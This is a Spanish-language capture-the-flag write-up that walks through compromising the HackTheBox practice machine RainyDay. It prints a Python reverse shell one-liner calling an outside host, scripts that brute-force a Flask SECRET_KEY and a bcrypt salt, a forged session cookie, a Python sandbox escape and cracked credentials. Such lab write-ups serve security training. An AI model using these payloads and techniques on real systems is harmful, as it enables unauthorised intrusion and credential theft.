---
title: Rainyday - HackTheBox
categories: [ Linux ]
tags: [HackTheBox]
---

<img src="/assets/img/HTB/Rainyday/Rainyday.jpg">

Buenas! El día de hoy completaremos la máquina [RainyDay](https://app.hackthebox.com/machines/RainyDay) de [HackTheBox](https://app.hackthebox.com), donde tocaremos los siguientes puntos:

- Docker 
- Pivoting
- Port Forwarding con Chisel
- RCE
- Flask Unsign
- Y muchas cosas más!

## Reconocimiento 

Comenzaremos con el clásico escaneo de nmap

```plaintext
❯ nmap 10.10.11.184
Nmap scan report for 10.10.11.184¡
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Cuando entramos a la web nos redirige a `rainycloud.htb`, así que tendremos que añadirlo al `/etc/hosts`

```plaintext
echo "10.10.11.184 rainycloud.htb" | sudo tee -a /etc/hosts
```

Al entrar en la web, podemos ver una aplicación de contenedores de docker

![](/assets/img/HTB/Rainyday/web1.png)

Esto huele a algún tipo de aplicacíón de Flask en el fondo. Sin embargo, podemos ver algo por la web y fuzzear por directorios, en mi caso voy a usar `gobuster`, pero podéis usar herarmientas como `wfuzz`, `ffuf` o `dirbuster`

```plaintext
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://rainycloud.htb -t 200
===============================================================
[+] Url:                     http://rainycloud.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
/login                (Status: 200) [Size: 3254]
/register             (Status: 200) [Size: 3686]
/api                  (Status: 308) [Size: 239] [--> http://rainycloud.htb/api/]
/logout               (Status: 302) [Size: 189] [--> /]
/new                  (Status: 302) [Size: 199] [--> /login]
```

Si fuzzeamos por subdominios también conseguimos el dominio `dev.rainycloud.htb`

```plaintext
❯ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://rainycloud.htb -t 200
===============================================================
[+] Url:                     http://rainycloud.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
Found: dev.rainycloud.htb (Status: 403) [Size: 26]
```

Añadimos el dominio al `/etc/hosts`

## Explotación

Investigando la función de login, podemos ver que en un intento fallido, esto aparece dentro del código fuente de la página

![](/assets/img/HTB/Rainyday/login_fail.png)

Con esto confirmamos que se está utilizando una aplicación Flask usando app.py

### Subdominio "dev"

Si nos metemos en el subdominio `dev`, nos damos cuenta de que hay algún tipo de WAF o ACL en la web

![](/assets/img/HTB/Rainyday/subdominio_ipinvalida.png)

Esto parece ser bypasseable por SSRF, pero ahora mismo es imposible

### Directorio API

Si nos fijamos anteriormente, encontramos el directorio /api, vamos a intentar fuzzear, ahora voy a utilizar `feroxbuster` para fuzzear recursivamente

![](/assets/img/HTB/Rainyday/feroxbuster.png)

Con este fuzzeo encontramos el directorio /api/user/01.0

![](/assets/img/HTB/Rainyday/api_jack.png)

Encontraremos otros 2 hashes, de `Gary` y de `root`, podemos crackear estos usando john, pero solo el hash de gary fue posible crackearlo.

![](/assets/img/HTB/Rainyday/gary_passwd.png)

Su contraseña es `rubberducky`, con estas contraseñas podemos logearnos en la web como gary

### Creación de contenedores

En el login, podemos crear nuevos contenedores de docker

![](/assets/img/HTB/Rainyday/docker1.png)

En el contenedor de docker, podemos ejecutar comandos, esto se puede conseguir con el botón de `execute command`, pero para conseguir una shell estable, usaremos el botón `Execute Command (background)`

![](/assets/img/HTB/Rainyday/docker2.png)

Podemos usar este payload para conseguir una reverse shell

```python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.37",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

Y con esto, conseguimos una shell!

```plaintext
> nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.37] from [UNKWOWM] [10.10.11.184] 41822
/ $ 
```

### Pivoting

Ahora, tenemos que pensar en cómo utilizar este contenedor para averiguar más sobre la máquina. En primer lugar, echaremos un vistazo a las direcciones IP y descubrimos que deberíamos escanear los otros contenedores presentes en esta red utilizando algún túnel. Lo que nos delató fue la dirección IP que termina en 3, lo que significa que probablemente hay otros hosts en este

![](/assets/img/HTB/Rainyday/ifconfig_contenedor1.png)

Transferiremos la herramienta [Chisel](https://github.com/jpillora/chisel) al contenedor y crearemos un túnel

![](/assets/img/HTB/Rainyday/chisel_contenedor1.png)

Lo más probable es que el host `172.18.0.1` (basado en otras máquinas), así que empezaremos por ahí. Testearemos si el puerto 22 y el 80 están abiertos, e igual a nuestro primer escaneo de nmap, los dos están abiertos.

```plaintext
> proxychains nc -nv 172.18.0.1 80
(UNKNOWN) [172.18.0.1] 80 (http) open : Operation now in progress
```

Ahora utilizaremos `curl` para ver que tiene la web

```plaintext
❯ proxychains -q curl 172.18.0.1
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://rainycloud.htb">http://rainycloud.htb</a>. If not, click the link.
```

Nos redirige al sitio web original. Anteriormente, encontramos el subdominio dev.rainycloud.htb, que estaba situado en la máquina original podría significar que dev.rainycloud.htb está hosteado en ese contenedor, nos vamos a intentar conectar a la web.

Para esto, tendremos que cambiar el túnel socks que se está utilizando.

![](/assets/img/HTB/Rainyday/chisel1_contenedor1.png)

También tendremos que cambiar el subdominio, ya que ahora está escuchando en el localhost

Y ahora podemos conectarnos al subdominio dev

![](/assets/img/HTB/Rainyday/dev_subdominio_web.png)

### Web dev

Entendiendo que anteriormente, había un directorio /api, vamos a ver ahí de nuevo

```plaintext
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dev.rainycloud.htb:3333 -t 200
===============================================================
[+] Url:                     http://dev.rainycloud.htb:3333
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
/login                (Status: 200) [Size: 3254]
/register             (Status: 200) [Size: 3686]
/new                  (Status: 302) [Size: 199] [--> /login]
/api                  (Status: 308) [Size: 247] [--> http://dev.rainycloud.htb/api/]
/logout               (Status: 302) [Size: 189] [--> /]
```

Ahora fuzzearemso en el directorio /api a ver si encontramos algo. Después de un largo tiempo, encontramos el directorio /api/healthcheck

```plaintext
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://dev.rainycloud.htb:3333/api -t 200
===============================================================
[+] Url:                     http://dev.rainycloud.htb:3333/api
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
/healthcheck            (Status: 200) [Size: 289]
```

Visitando la web nos devuelve un objeto JSON

![](/assets/img/HTB/Rainyday/healthcheck.png)

La parte de abajo es la más interesante porque contiene una regex y un tipo CUSTOM. Esta página parece estar indicándonos parámetros para una petición POST quizá.

Estamos en lo correcto, pero nos pone que no estamos autenticados 

![](/assets/img/HTB/Rainyday/burp1.png)

Vamos a copiar la cookie de la web principal que teníamos como gary, y funciona

![](/assets/img/HTB/Rainyday/burp2.png)

Ahora que sabemos que existe un app.py, significa que quizá hay un secret.py, porque esto es una aplicación Flask

![](/assets/img/HTB/Rainyday/burp3.png)

Jugando un poco más, nos muestra que el `custom type` necesita de un parámetro `pattern`, indicándonos que podemos filtrar archivos por expresiones regulares, el resultado true/false nos dice que si el carácter está en él.

![](/assets/img/HTB/Rainyday/burp4.png)

Así que ahora, necesitamos crear un script para brute forcear los caracteres de la SECRET_KEY, porque es necesario para decodificar la cookie y (quizá), obtener una contraseña

### Fuerza bruta SECRET_KEY

Podemos crear un script rápido en python para bruteforcear y conseguir la key.

```python
#!/usr/bin/python3

import string
import requests
import json

chars = string.printable
cookies = {'session': 'eyJ1c2VybmFtZSI6ImdhcnkifQ.Y_DUWA.hd-WRumWtu0J3IKLIv2UrYJ4Sjw'}

s = requests.Session()
pattern = ""

while True:
    for c in chars:
        try:
            rsp = s.post('http://dev.rainycloud.htb:3333/api/healthcheck', {
                'file': '/var/www/rainycloud/secrets.py',
                'type': 'custom',
                'pattern': "^SECRET_KEY = '" + pattern + c + ".*"
            }, cookies=cookies)
            if json.loads(rsp.content)['result']:
                pattern += c
                print(pattern)
                break
            else:
               pass
               # print(c)
        except Exception:
            print(rsp.content)
```

Esto nos genera la SECRET_KEY

![](/assets/img/HTB/Rainyday/secretkey.png)

Ahora podremos conseguir otra cookie usando la herramienta `flask-unsign` y conseguir una sesión como Jack

```plaintext
❯ flask-unsign --sign --cookie "{'username':'jack'}" --secret f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67
eyJ1c2VybmFtZSI6ImphY2sifQ.Y_Dhfg.Yuo3x628keLVTOK1iiN3KhBUbNU
```

Reemplazamos las cookies y ahora tenemos RCE como jack usando el contenedor que jack creó

## Contenedor de Jack

Ahora que estamos en el contenedor, podemos subir el [pspy](https://github.com/DominicBreuker/pspy) para monitorizar los procesos a nivel de sistema. Podemos entender que no hay otro contenedor para pivotar, así que deberíamos de ver que pasa en el contenedor actual

Lo que vemos es este comando

![](/assets/img/HTB/Rainyday/comando.png)

Es raro este `sleep` tan largo. Vamos a investigar el comando en el directorio `/proc`

![](/assets/img/HTB/Rainyday/proc.png)

Existe el directorio `root` dentro del proceso, y al entrar en él observamos otro directorio linux /. Este contiene la user flag y el directorio home de jack

![](/assets/img/HTB/Rainyday/user.png)

También tiene la clave `id_rsa` privada de jack

![](/assets/img/HTB/Rainyday/id_rsa.png)

Con esto, finalmente nos podremos conectar a la máquina como jack.

![](/assets/img/HTB/Rainyday/ssh.png)

## Escalada de Privilegios

Checkeando los privilegios `sudo`, vemos esto

```plaintext
jack@rainyday:~$ sudo -l
Matching Defaults entries for jack on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on localhost:
    (jack_adm) NOPASSWD: /usr/bin/safe_python *
```

No estaba seguro de lo que era safe_python, pero se ve que es algún tipo de binario. No somos capaces de ver lo que hace, lo que es muy raro. Pero podemos abrir archivos y parece aceptar archivos como parámetro

![](/assets/img/HTB/Rainyday/safe_python.png)

```plaintext
jack@rainyday:~$ echo "hola" > /tmp/test.txt
jack@rainyday:~$ chmod 777 /tmp/test.txt
jack@rainyday:~$ sudo -u jack_adm /usr/bin/safe_python /tmp/test.txt
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1, in <module>
NameError: name 'hola' is not defined
jack@rainyday:~$ 
```

Hay una función exec() siendo llamada, lo que siempre es interesante. Este binario parece ejecutar código python dentro de un entorno establecido o algo así. Así que necesitamos crear un script python que se ejecute para obtener un shell como jack_adm.

Las siguientes pruebas confirman esto:

```plaintext
jack@rainyday:~$ echo 'importlib.import_module("os").system("ls")' > /tmp/test.txt
jack@rainyday:~$ sudo -u jack_adm /usr/bin/safe_python /tmp/test.txt 
Traceback (most recent call last):
  File "/usr/bin/safe_python", line 29, in <module>
    exec(f.read(), env)
  File "<string>", line 1, in <module>
NameError: name 'importlib' is not defined
jack@rainyday:~$ 
```

Parece que hay algunas palabras clave que se filtran, sobre todo "import", porque no puedo ejecutar nada que como import dentro de ella.

Encontré esta [página](https://hexplo.it/post/escaping-the-csawctf-python-sandbox/) que me fué muy útil

Utilizando su método y manejando para tener el número, fué 144

```plaintext
jack@rainyday:~$ python3
>>> import warnings
>>> [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
144
>>> 
```

Bien, entonces necesitamos de alguna manera hacer uso de esto para importar la librería os. Técnicamente podría importar un carácter de cada una de las clases y luego deletrear 'import os', pero eso sería... muy muy largo.

Tiene que haber una manera de cargar el módulo que queremos. Finalmente, después de unas horas de trastear con esto, ¡lo conseguímos!

```plaintext
jack@rainyday:~$ echo 'print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__["__builtins__"]["__loader__"]().load_module("builtins").__import__("os").system("bash -i"))' > /tmp/test.txt
jack@rainyday:~$ sudo -u jack_adm /usr/bin/safe_python /tmp/test.txt 
jack_adm@rainyday:/home/jack$ 
```

### hash_password.py

Después de conseguir jack_adm, podemos checkear privilegios de `sudo` para ver esto

```plaintext
jack_adm@rainyday:/home/jack$ sudo -l
Matching Defaults entries for jack_adm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack_adm may run the following commands on localhost:
    (root) NOPASSWD: /opt/hash_system/hash_password.py
jack_adm@rainyday:/home/jack$ 
```

Otro desafío Sudo a ciegas en Python. Excepto, todo lo que esto hace es hashear contraseñas para nosotros en formato Bcrypt.

```plaintext
jack_adm@rainyday:/home/jack$ sudo /opt/hash_system/hash_password.py
Enter Password> 123
[+] Hash: $2b$05$yENY3M6EKuWI70jdL20Oc.M41cMT4OHveqEUhsbf3Cuxiwj6dIu/2
jack_adm@rainyday:/home/jack$ 
```

Esto es, sin duda, similar a los hashes iniciales que encontramos en el sitio web. Probablemente necesitemos crackear el hash de root que encontramos mucho antes para conseguir un shell de root vía SSH.

Ahora que tenemos esto, necesitaríamos averiguar de alguna manera el salt para esta contraseña antes de crackearla. Hay un límite de longitud de 30 para este script.

### Bcrypt Exploit

Utilicé un generador UTF-8 en línea para intentar encontrar una combinación válida de caracteres que fuera suficiente para las pruebas.

Aquí hay 2 casos de uso de caracteres UTF en el hashing de este algoritmo con el script de la máquina. Si verificara estos dos hashes, serían idénticos. El 123456 no es hasheado al final, porque hemos introducido más de 72 bytes de datos.

Teóricamente podríamos generar una entrada de 71 bytes, y luego dejar el último carácter al salt y repetir por fuerza bruta todos los caracteres posibles uno a uno. Así que con cada carácter que encontramos, tenemos que editar nuestra entrada en consecuencia para tener 1 byte menos y encajar la flag allí. Rápidamente crearemos un script para probar esto, y este fue el resultado final:

```python
#!/usr/bin/python3

import bcrypt
import string
passwd = u'痊茼ﶉ呍ᑫ䞫빜逦ᒶ덋䊼鏁耳䢈筮鰽Ἀᒅaa' #randomly generated
hashed_passwd = u'$2b$05$/vRnmg4ma.8Nkl4FBmWfze.ts9jKrY5tNqqoenp5WN3ZtHxRU8NmC' # taken from sudo as adm user
allchars = string.printable
flag = 'H34vyR41n'
for c in allchars:
	testpasswd = passwd + flag + c
	if bcrypt.checkpw(testpasswd.encode('utf-8'),hashed_passwd.encode('utf-8')):
		print("match at " + c)
```

El resultado sería algo como esto:

![](/assets/img/HTB/Rainyday/resultado1.png)

H es el primer carácter de la sal. Las pruebas repetidas de este script muestran que el primer carácter de este hash no cambia, lo que indica que la sal es estática y no generada aleatoriamente. Por lo tanto, podemos sacar la sal char por char.

Podemos seguir sacando los siguientes caracteres cambiando la contraseña hash y la contraseña en texto plano, eliminando 1 byte cada vez y añadiendo uno a nuestra variable flag.

![](/assets/img/HTB/Rainyday/resultado2.png)

H34vyR41n' es el salt final, y ahora podemos descifrar el hash original de root que encontramos antes.

Podemos generar una lista de palabras con rockyou.txt con el nuevo salt al final.

```plaintext
❯ sed 's/$/H34vyR41n/' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt > wordlist.txt
```

Así que ahora podremos crackear el hash facilmente para conseguir la contraseña de root

```plaintext
❯ john --wordlist=wordlist.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
246813579H34vyR41n (root)
1g 0:00:00:01 DONE (2023-02-18 15:30) 0.6993g/s 6646p/s 6646c/s 6646C/s lllllH34vyR41n..123456
H34vyR41n
Use the "--show" option to display all of the cracked passwords realibly
Session completed.
```

Ahora podemos hacer `su` para convertirnos en root y conseguir la flag

```plaintext
jack_adm@rainyday:~$ su root
Password:
root@rainyday:~# cat root.txt 
54b2f2c54fd5e28d776d0490a35a7815
root@rainyday:~# 
```

Gracias por ver!!